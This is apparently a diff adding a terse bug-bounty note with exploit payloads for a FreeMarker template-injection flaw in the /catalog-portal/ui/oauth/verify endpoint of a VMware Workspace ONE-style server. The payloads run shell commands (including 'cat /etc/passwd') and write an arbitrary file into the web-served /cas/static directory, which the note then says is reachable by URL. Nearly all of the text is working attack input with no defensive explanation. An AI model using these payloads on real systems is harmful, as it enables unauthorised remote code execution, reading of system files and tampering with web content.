@@ -1,0 +1,17 @@
+
+https://www.youtube.com/watch?v=HG8jeoEO-mk
+
+
+/catalog-portal/ui/oauth/verify?error=&deviceUdid=${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}  
+
+
+/catalog-portal/ui/oauth/verify?error=&deviceUdid=${"freemarker.template.utility.Execute"?new()("command")}
+
+write to file: /catalog-portal/ui/oauth/verify?error=&deviceUdid=${"freemarker.template.utility.ObjectConstructor"?new()("java.io.FileOutputStream","/opt/vmware/horizon/workspace/webapps/cas/static/bbh.txt").write("freemarker.template.utility.ObjectConstructor"?new()("java.lang.String","the bbh is here darling").getBytes())}
+
+
+
+now the i have the File in  /cas/static/file.txt
+
+https://domain.com/cas/static/file.txt
+
